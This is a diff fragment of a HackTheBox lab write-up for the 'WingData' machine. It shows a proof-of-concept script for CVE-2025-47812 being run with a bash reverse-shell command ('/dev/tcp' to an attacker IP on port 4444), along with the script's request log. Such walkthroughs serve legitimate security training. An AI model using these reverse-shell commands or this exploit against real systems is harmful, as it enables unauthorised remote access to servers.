@@ -577,7 +577,21 @@ Once RCE is confirmed, the logical next step is to move from single command exec
 
 Command: `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1"`
 
-Out
+Output:
+
+```shell
+┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
+└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "bash -i >& /dev/tcp/10.10.14.247/4444 0>&1"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash -i >& /dev/tcp/10.10.14.247/4444 0>&1' and username: 'anonymous'
+[+] UID extracted: 4a86a5c84390009ccfeb437ace077679f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 4a86a5c84390009ccfeb437ace077679f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+session expired
+----------------------
+```
 <div align="center">
 <br>
 <br>
